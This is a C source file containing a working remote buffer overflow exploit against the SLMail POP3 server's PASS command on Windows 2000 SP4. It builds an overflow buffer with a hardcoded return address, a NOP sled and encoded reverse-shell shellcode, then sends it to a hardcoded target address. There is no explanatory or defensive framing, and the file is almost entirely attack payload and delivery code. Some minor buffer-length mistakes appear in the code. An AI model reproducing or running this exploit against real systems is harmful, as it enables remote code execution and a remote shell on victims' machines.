#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>

#define retadd "\x8f\x35\x4a\x5f" /*win2k server sp4 0x773a459f*/
#define port 110

/* revshell العراق القراصنة المجموعة*/
char shellcode[] =
"\xbd\xa1\x09\xeb\xba\xdb\xc1\xd9\x74\x24\xf4\x5b\x29\xc9\xb1"
"\x52\x31\x6b\x12\x83\xeb\xfc\x03\xca\x07\x09\x4f\xf0\xf0\x4f"
"\xb0\x08\x01\x30\x38\xed\x30\x70\x5e\x66\x62\x40\x14\x2a\x8f"
"\x2b\x78\xde\x04\x59\x55\xd1\xad\xd4\x83\xdc\x2e\x44\xf7\x7f"
"\xad\x97\x24\x5f\x8c\x57\x39\x9e\xc9\x8a\xb0\xf2\x82\xc1\x67"
"\xe2\xa7\x9c\xbb\x89\xf4\x31\xbc\x6e\x4c\x33\xed\x21\xc6\x6a"
"\x2d\xc0\x0b\x07\x64\xda\x48\x22\x3e\x51\xba\xd8\xc1\xb3\xf2"
"\x21\x6d\xfa\x3a\xd0\x6f\x3b\xfc\x0b\x1a\x35\xfe\xb6\x1d\x82"
"\x7c\x6d\xab\x10\x26\xe6\x0b\xfc\xd6\x2b\xcd\x77\xd4\x80\x99"
"\xdf\xf9\x17\x4d\x54\x05\x93\x70\xba\x8f\xe7\x56\x1e\xcb\xbc"
"\xf7\x07\xb1\x13\x07\x57\x1a\xcb\xad\x1c\xb7\x18\xdc\x7f\xd0"
"\xed\xed\x7f\x20\x7a\x65\x0c\x12\x25\xdd\x9a\x1e\xae\xfb\x5d"
"\x60\x85\xbc\xf1\x9f\x26\xbd\xd8\x5b\x72\xed\x72\x4d\xfb\x66"
"\x82\x72\x2e\x28\xd2\xdc\x81\x89\x82\x9c\x71\x62\xc8\x12\xad"
"\x92\xf3\xf8\xc6\x39\x0e\x6b\xe3\xbd\x10\x6f\x9b\xbf\x10\x6e"
"\xe0\x49\xf6\x1a\x06\x1c\xa1\xb2\xbf\x05\x39\x22\x3f\x90\x44"
"\x64\xcb\x17\xb9\x2b\x3c\x5d\xa9\xdc\xcc\x28\x93\x4b\xd2\x86"
"\xbb\x10\x41\x4d\x3b\x5e\x7a\xda\x6c\x37\x4c\x13\xf8\xa5\xf7"
"\x8d\x1e\x34\x61\xf5\x9a\xe3\x52\xf8\x23\x61\xee\xde\x33\xbf"
"\xef\x5a\x67\x6f\xa6\x34\xd1\xc9\x10\xf7\x8b\x83\xcf\x51\x5b"
"\x55\x3c\x62\x1d\x5a\x69\x14\xc1\xeb\xc4\x61\xfe\xc4\x80\x65"
"\x87\x38\x31\x89\x52\xf9\x51\x68\x76\xf4\xf9\x35\x13\xb5\x67"
"\xc6\xce\xfa\x91\x45\xfa\x82\x65\x55\x8f\x87\x22\xd1\x7c\xfa"
"\x3b\xb4\x82\xa9\x3c\x9d";

struct sockaddr_in plm,lar,target;

int conn(char *ip)
{
 int sockfd;
 plm.sin_family = AF_INET;
 plm.sin_port = htons(port);
 plm.sin_addr.s_addr = inet_addr(ip);
 bzero(&(plm.sin_zero),8);
 sockfd = socket(AF_INET,SOCK_STREAM,0);
if((connect(sockfd,(struct sockaddr *)&plm,sizeof(struct sockaddr))) < 0)
{
 perror("[-] connect error!");
 exit(0);
}
 printf("[*] Connected to: %s.\n",ip);
 return sockfd;
}

int main(int argc, char *argv[])
{
    int xs;
    char out[1024];
    char *buffer = malloc(2960);
    memset(buffer, 0x00, 2960);
    char *off = malloc(2606);
    //memset(off, 0x00, 2606);
    memset(off, 0x41, 2606);
    char *nop = malloc(13);
    //memset(nop, 0x00, 13);
    memset(nop, 0x90, 16);
    strcat(buffer, off);
    strcat(buffer, retadd);
    strcat(buffer, nop);
    strcat(buffer, shellcode);

    printf("[+] SLMAIL Remote buffer overflow exploit in POP3 PASS by Haroon Rashid Astwat.\n");
    xs = conn("10.11.15.105");
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"USER username\r\n", 15);
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"PASS ",5);
    write(xs,buffer,strlen(buffer));
    printf("Shellcode len: %d bytes\n",strlen(shellcode));
    printf("Buffer len: %d bytes\n",strlen(buffer));
    write(xs,"\r\n",4);
    close(xs);
}
